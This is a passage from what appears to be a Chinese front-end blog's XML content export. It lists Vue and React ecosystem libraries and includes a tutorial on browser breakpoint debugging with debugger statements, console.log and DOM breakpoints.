图标库，此图标库起初专门针对其组件（从表单控件到导航）和文档进行定制设计和构建，现在可以免费用于任何项目。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658238892194-7bb1c0dd-f6e3-4acc-a42b-d81066841b10.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658238892194-7bb1c0dd-f6e3-4acc-a42b-d81066841b10.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="bSFKx"></a></p><h1 id="10-富文本编辑器"><a href="#10-富文本编辑器" class="headerlink" title="10. 富文本编辑器"></a>10. 富文本编辑器</h1><p><a name="ugxR9"></a></p><h2 id="（1）Tiptap"><a href="#（1）Tiptap" class="headerlink" title="（1）Tiptap"></a>（1）Tiptap</h2><p>Tiptap 是一个基于 Vue 的无渲染的富文本编辑器，它基于 Prosemirror，完全可扩展且无渲染。可以轻松地将自定义节点添加为 Vue 组件。使用无渲染组件（函数式组件），几乎完全控制标记和样式。菜单的外观或在 DOM 中的显示位置。这完全取决于使用者。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658239070542-7d1881e5-6895-48e3-835b-60347593c1e7.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658239070542-7d1881e5-6895-48e3-835b-60347593c1e7.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="iKndu"></a></p><h2 id="（2）Quill-js"><a href="#（2）Quill-js" class="headerlink" title="（2）Quill.js"></a>（2）Quill.js</h2><p>Quill.js 是一个具有跨平台和跨浏览器支持的富文本编辑器。凭借其可扩展架构和富有表现力的 API，可以完全自定义它以满足个性化的需求。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658239127493-66aaeb22-6fe3-4efb-a41d-36f444b8137f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658239127493-66aaeb22-6fe3-4efb-a41d-36f444b8137f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="JszhF"></a></p><h2 id="（3）TinyMCE"><a href="#（3）TinyMCE" class="headerlink" title="（3）TinyMCE"></a>（3）TinyMCE</h2><p>TinyMCE 是一个热门的富文本编辑器。它的目标是帮助其他开发人员构建精美的 Web 内容解决方案。它易于集成，可以部署在基于云的、自托管或混合环境中。该设置使得合并诸如 Angular、React 和 Vue 等框架成为可能。它还可以使用 50 多个插件进行扩展，每个插件都有 100 多个自定义选项。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658239167968-a3ca0fe5-d35a-404f-968c-5a78c8ab6ac9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658239167968-a3ca0fe5-d35a-404f-968c-5a78c8ab6ac9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="srS3i"></a></p><h2 id="（4）CKEditor-5"><a href="#（4）CKEditor-5" class="headerlink" title="（4）CKEditor 5"></a>（4）CKEditor 5</h2><p>CKEditor 是一个强大的富文本编辑器框架，具有模块化架构、现代集成和协作编辑等功能。它可以通过基于插件的架构进行扩展，从而可以将必要的内容处理功能引入。它是在 ES6 中从头开始编写的，并且具有出色的 webpack 支持。可以使用与 Angular、React 和 Vue.js 的原生集成。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658239213415-71bfed0f-d331-471a-bacc-beecf4548811.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658239213415-71bfed0f-d331-471a-bacc-beecf4548811.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="RoXN9"></a></p><h1 id="11-服务端渲染"><a href="#11-服务端渲染" class="headerlink" title="11. 服务端渲染"></a>11. 服务端渲染</h1><p><a name="o4GBT"></a></p><h2 id="（1）Nuxt-js"><a href="#（1）Nuxt-js" class="headerlink" title="（1）Nuxt.js"></a>（1）Nuxt.js</h2><p>Nuxt.js 是一个基于 Vue.js 的通用应用框架。通过对客户端&#x2F;服务端基础架构的抽象组织，Nuxt.js 主要关注的是应用的 UI 渲染。它预设了利用 Vue.js 开发服务端渲染的应用所需要的各种配置。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658239456606-2e79a410-44dc-4551-a754-03d333d79615.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658239456606-2e79a410-44dc-4551-a754-03d333d79615.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="iTCSa"></a></p><h2 id="（2）SSR"><a href="#（2）SSR" class="headerlink" title="（2）SSR"></a>（2）SSR</h2><p>ssr 框架是为前端框架在服务端渲染的场景下所打造的开箱即用的服务端渲染框架。面向 Serverless，同时支持 React，Vue2，Vue3。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658240199585-5d031fd6-2d20-4c2a-b798-e362be63c7fe.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658240199585-5d031fd6-2d20-4c2a-b798-e362be63c7fe.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="FTEyM"></a></p><h2 id="（3）Vue-meta"><a href="#（3）Vue-meta" class="headerlink" title="（3）Vue-meta"></a>（3）Vue-meta</h2><p>Vue-meta 是 Vue.js 的一个插件，它可以帮助你使用 SSR 支持管理 Vue.js 组件中的 HTML 元数据。Vue-meta 使用 Vue 的内置响应性使管理应用程序的元数据变得简单。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658243064630-bf87b19d-815b-46ee-a47e-5f90e287c24f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658243064630-bf87b19d-815b-46ee-a47e-5f90e287c24f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="G8zrq"></a></p><h1 id="12-数据获取"><a href="#12-数据获取" class="headerlink" title="12. 数据获取"></a>12. 数据获取</h1><p><a name="bGEpO"></a></p><h2 id="（1）Axios"><a href="#（1）Axios" class="headerlink" title="（1）Axios"></a>（1）Axios</h2><p>Axios 是一个基于 promise 的网络请求库，作用于 node.js 和浏览器中。 <br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658245855529-91574ed1-2434-414f-a13e-1b3c1e7fee43.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658245855529-91574ed1-2434-414f-a13e-1b3c1e7fee43.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="uCWIU"></a></p><h2 id="（2）vue-resource"><a href="#（2）vue-resource" class="headerlink" title="（2）vue-resource"></a>（2）vue-resource</h2><p>vue-resource 是 Vue.js 的一款插件，它可以通过 XMLHttpRequest 或 JSONP 发起请求并处理响应。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658245988797-334b4815-9a67-49f9-bfe8-04254a81f0e1.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658245988797-334b4815-9a67-49f9-bfe8-04254a81f0e1.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="s2XtZ"></a></p><h2 id="（3）vue-axios"><a href="#（3）vue-axios" class="headerlink" title="（3）vue-axios"></a>（3）vue-axios</h2><p>vue-axios 是一个将 axios 集成到 Vuejs 的小型库。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658246069841-a1466034-acb2-4a66-ac9b-c1ec926ab7e8.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658246069841-a1466034-acb2-4a66-ac9b-c1ec926ab7e8.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="NEJk1"></a></p><h1 id="13-构建工具"><a href="#13-构建工具" class="headerlink" title="13. 构建工具"></a>13. 构建工具</h1><p><a name="TmHvW"></a></p><h2 id="（1）Vite"><a href="#（1）Vite" class="headerlink" title="（1）Vite"></a>（1）Vite</h2><p>Vite 是下一代前端开发与构建工具。Vite 意在提供开箱即用的配置，同时它的插件 API 和 JavaScript API 带来了高度的可扩展性，并有完整的类型支持。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658246353785-4aecbd73-e51a-482f-b3aa-eceed2a3ee78.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658246353785-4aecbd73-e51a-482f-b3aa-eceed2a3ee78.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="h8UOM"></a></p><h2 id="（2）Webpack"><a href="#（2）Webpack" class="headerlink" title="（2）Webpack"></a>（2）Webpack</h2><p>webpack 是一个用于现代 JavaScript 应用程序的静态模块打包工具。当 webpack 处理应用程序时，它会在内部构建一个依赖图(dependency graph)，此依赖图对应映射到项目所需的每个模块，并生成一个或多个 bundle。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658246649786-ce029da9-a405-4cf9-98ab-e317cd8a4a6e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1658246649786-ce029da9-a405-4cf9-98ab-e317cd8a4a6e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> 收藏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>debug断点调试</title>
      <link href="/2021/08/22/frontend/browser/debug/debug-duan-dian-diao-shi/"/>
      <url>/2021/08/22/frontend/browser/debug/debug-duan-dian-diao-shi/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="62glah"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前端开发中我们最常需要调试的部分是 JS ，在调试 JS 的过程中，我们最常使用的方法便是 debug 调试。何为 debug 调试？ debug 调试又名断点调试，它指的是在程序指定位置设置断点，当程序运行到这个断点时会暂停执行并保留当前状态，我们可以通过查看暂停时的程序状态来定位和排查问题。</p><p>那么为什么我们需要用这种调试方法呢？实际开发中，当我们完成一个功能，但是发现在浏览器中未否生效时，如果没有很丰富的经验，我们很难直接定位到问题所在。因为这个时候程序已经完成了执行，程序中大部分使用过的变量已经被回收了。但是有了 debug 调试，我们可以在程序运行过程中实时查看它的运行状态，甚至可以一步一步得调试，来看每一个变量在每一步是如何变化的，这对我们排查异常非常有效。接下来我们来看以下几种常用的 debug 调试方法。</p><p><a name="wvsiew"></a></p><h3 id="1-代码中设置-debugger-断点或打印信息"><a href="#1-代码中设置-debugger-断点或打印信息" class="headerlink" title="1. 代码中设置 debugger 断点或打印信息"></a>1. 代码中设置 debugger 断点或打印信息</h3><p>最简单的 debug 方法，是在我们希望调试的代码前加上一行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">debugger</span>;</span><br></pre></td></tr></table></figure><p>只需要这么一行代码，就能使得程序的滚滚推进戛然而止，并且停在你想要的位置。我们亲手尝试一下，先写下一段 HTML</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>debug调试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;word&quot;</span>&gt;</span>这是一段文字<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;action.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>再在与 HTML 文件的相同位置写下如下 JS ，命名为 action.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getNewName</span>(<span class="params">name1,name2</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> c = name1.<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">4</span>),</span><br><span class="line">      d = name2.<span class="title function_">slice</span>(<span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> c + d ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showNewName</span>(<span class="params"></span>)&#123;</span><br><span class="line"> <span class="keyword">var</span> a = <span class="string">&#x27;FreeStyle&#x27;</span>,</span><br><span class="line">  b = <span class="string">&#x27;CuteFaller&#x27;</span>;</span><br><span class="line"> <span class="keyword">var</span> newName = <span class="title function_">getNewName</span>(a,b);</span><br><span class="line"> <span class="keyword">var</span> word = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;word&#x27;</span>);</span><br><span class="line"> <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> newWord = <span class="string">&#x27;新文字：&#x27;</span> + newName ;</span><br><span class="line">  word.<span class="property">innerText</span> = newWord ;</span><br><span class="line">  word.<span class="title function_">setAttribute</span>(<span class="string">&#x27;isNewName&#x27;</span>,<span class="literal">true</span>)</span><br><span class="line"> &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">showNewName</span>();</span><br></pre></td></tr></table></figure><p>保存后在浏览器中打开 HTML 文件，我们会发现浏览器中“这是一段文字”在一秒钟之后变成了另一行文字。为什么会有这样的变化呢？我们在程序中设置一个断点来调试看看。在 getNewName 方法中写下一行 debugger;</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getNewName</span>(<span class="params">name1,name2</span>)&#123;</span><br><span class="line">  <span class="keyword">debugger</span>;</span><br><span class="line">  <span class="keyword">var</span> c = name1.<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">4</span>),</span><br><span class="line">      d = name2.<span class="title function_">slice</span>(<span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> c + d ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存文件并刷新浏览器，我们发现页面进入了断点位置</p><p>进入断点</p><p>打开控制台，此时我们停留在 Sources 一栏，还记得上一章介绍的内容吗？ Sources 展示着当前页面的资源，因此我们所写的 JS 代码自然也是可以在这里找到的。</p><p>仔细观察断点处，我们看到给 getNewName 方法传递的两个参数都有了值，控制台在代码边上备注了 “name1 &#x3D; “FreeStyle” , name2 &#x3D; “CuteFaller””这是当前函数执行时的变量值。</p><p>当我们用鼠标选中 name1.slice(0,4) 这一行，我们可以看到鼠标上方出现了一个显示 “Free”的气泡，这是浏览器执行这一句指令返回的结果。</p><p>查看运行情况</p><p>断点状态下按 F8 可以跳过当前断点继续执行，直到程序结束或是进入到下一个断点。按 F10 可以进行单步调试，即一行一行得执行代码，每一行的细节都可以进行查看。</p><p>除了可以在代码中写 debugger; 我们还可以通过 console.log(); 方法打印我们想要的信息。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getNewName</span>(<span class="params">name1,name2</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> c = name1.<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">4</span>),</span><br><span class="line">      d = name2.<span class="title function_">slice</span>(<span class="number">4</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(c);</span><br><span class="line">  <span class="keyword">return</span> c + d ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在代码中加上一行打印，刷新页面发现没有进入断点。打开控制台，我们在 Console 中看到一行打印信息 “Free” 这就是我们打印的变量 c 的值。程序在执行到打印 c 的时候会将 c 当时的值打印到控制台，这样我们不需要进入断点也能够查看自己想知道的变量在运行阶段的值。</p><p>当然，我们还可以将两者并存，当程序进入到断点的时候，我们能通过 Console 控制台查看变量的值。断点状态下， Console 控制台会保留运行时的值和状态，我们可以在控制台直接访问当前执行函数内的变量。此外，当程序报错时，我们会第一时间在 Console 中看到，点击 Console 中的错误详情，就会跳转到 Sources 中的报错文件里，因此某种程度上，在调试过程中两者有着非常密切的联系。</p><p>最后要着重提醒的一点是，由于 debugger 和 console 这两种方式都是在源代码上添加的调试指令，所以当我们完成调试以后，<strong>一定要将它们删除</strong>，否则代码上线后他人也会进入到断点中，无法流畅得使用网页。</p><p><a name="if4mge"></a></p><h3 id="2-浏览器-Sources-中手动打断点"><a href="#2-浏览器-Sources-中手动打断点" class="headerlink" title="2. 浏览器 Sources 中手动打断点"></a>2. 浏览器 Sources 中手动打断点</h3><p>上一节内容我们介绍了如何进行 debug 调试，大家可能会觉得这样调试有些繁琐，要去源码中加调试代码，调完还得记得删除掉。那么我们在这一章，给大家提供一个简单明了的办法 —— 直接在 Sources 中调试。</p><p>大家可以回顾一下上一章中我们对 JS 的调试，在 Sources 中通过 ctrl + P 找到我们希望调试的代码文件，ctrl + F 定位到我们想要调试的行。接下来，我们可以在文件的侧边栏上设置断点，设置方法就是在行数上单击。单击后行数上出现一个蓝色的便签，就表示已经在这一行上设置了断点，接下来刷新页面就可以进入到断点中查看了。</p><p>进入断点之后我们其实可以在浏览器的文件上进行编辑，不用进入源文件修改代码，就能够进行代码尝试。<br />编写临时代码</p><p>比如我们先进入到函数 getNewName 的断点中，再将代码 d &#x3D; name2.slice(4); 改写为 d &#x3D; name2.slice(4,6); 按 ctrl + S 保存。接下来按 F10 单步执行，当执行到这一句时，我们发现浏览器已经按照我们改写的代码执行了 d &#x3D; “Fa”，说明我们的临时代码生效了。</p><p>临时代码生效</p><p>跳过断点，页面上显示出 “新文字：FreeFa”，说明我们的改动并不影响后续逻辑的继续执行。但是数据已经按我们期望的临时改动展现了出来。</p><p>继续执行</p><p>这样进行代码调试我们不需要改变源代码即可对问题进行排查，非常灵活和快捷。想在什么地方设置断点只需要在 Sources 中找到对应的文件，点击一下想设置断点的那一行即可，无需改动源码，效率大大提升。调试结束后再次点击这些断点即可解除断点，对他人的网页不会造成任何影响。</p><p><a name="xy16us"></a></p><h3 id="3-浏览器-DOM-节点设置断点"><a href="#3-浏览器-DOM-节点设置断点" class="headerlink" title="3. 浏览器 DOM 节点设置断点"></a>3. 浏览器 DOM 节点设置断点</h3><p>最后我们再来看看 DOM 节点上设置断点的方法。我们在开发页面的时候，往往会对 DOM 节点做变更处理，假设业务场景比较复杂，你并不能确定某一个 DOM 的变化是由哪一个文件执行导致的。这时我们可以换一个角度，从 DOM 出发，监听 DOM 变化，再反过来追查引发其变化的代码。</p><p>浏览器提供了这样的操作，我们先在 Elements 模块中找到我们需要监听的 DOM 节点（这里我们以 p 节点为例），找到以后点击右键，选择 Break On 。里面可以监听三种变化类型：subtree modifications、attribute modifications 和 node removal。分别是对应子节点树更新、修改节点属性和移除节点。</p><p>监听节点操作</p><p>这里我们选择 attribute modifications 。接下来我们刷新页面，一秒钟之后进入断点。查看断点的位置，这里的代码是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">word.<span class="title function_">setAttribute</span>(<span class="string">&#x27;isNewName&#x27;</span>,<span class="literal">true</span>)</span><br></pre></td></tr></table></figure><p>正是这行代码在给 p 标签添加了名为 isNewName 的属性。</p><p>DOM 变化进入断点</p><p>这样我们就定位了引起 p 节点属性变化的 JS 代码，是不是很方便？对于不符合预期的节点变换，也可以通过这样的方式去追踪，真相很快就能浮出水面啦。</p><p><a name="x5emql"></a></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>以上，是我们常用的几种 debug 调试方法。开发过程中妥善利用它，对我们的开发效率和排查问题的能力都有很大的帮助。当然，想学会调试最重要的还是要多尝试，熟能生巧。利器已在眼前，还请亲手体验。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
          <category> 调试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器 </tag>
            
            <tag> 调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React 库</title>
      <link href="/2021/06/22/frontend/collection/wheel/react-ku/"/>
      <url>/2021/06/22/frontend/collection/wheel/react-ku/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659661028895-0903535d-f3f2-4f99-8c0f-69bdfefb5694.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659661028895-0903535d-f3f2-4f99-8c0f-69bdfefb5694.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>1、状态管理</strong><br /><strong>（1）React Redux</strong><br />Redux 是 JavaScript 应用程序的状态容器，提供可预测的状态管理。React Redux 是 Redux 官方实现的 React 绑定。可以让你构建一致化的应用，运行于不同的环境（客户端、服务器、原生应用），并且易于测试。不仅于此，它还提供超爽的开发体验。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659623141620-84e290b8-c9ba-4a4e-8e65-295891ad4860.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659623141620-84e290b8-c9ba-4a4e-8e65-295891ad4860.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）Mobx</strong><br />MobX 是一个身经百战的库，它通过运用透明的函数式响应编程使状态管理变得简单和可扩展。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659623224139-396bcd40-f8ae-4ec4-b05f-1b4d5da9a487.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659623224139-396bcd40-f8ae-4ec4-b05f-1b4d5da9a487.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（4）Redux-Saga</strong><br />redux-saga 是一个旨在使应用程序的副作用（即，数据获取等异步操作和访问浏览器缓存等不纯操作）更易于管理、执行更高效、易于测试以及更好地处理故障的库。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659621552419-2bcd4f4f-b8b1-4824-a2b6-b91492889f19.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659621552419-2bcd4f4f-b8b1-4824-a2b6-b91492889f19.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>2、文档网站</strong><br /><strong>（1）Docusaurus</strong><br />Docusaurus 是由 facebook 开源的一个用于轻松构建、部署和维护开源项目网站的项目。使用 Docusaurus 可以让你<strong>专注于内容</strong>，并只需编写 Markdown 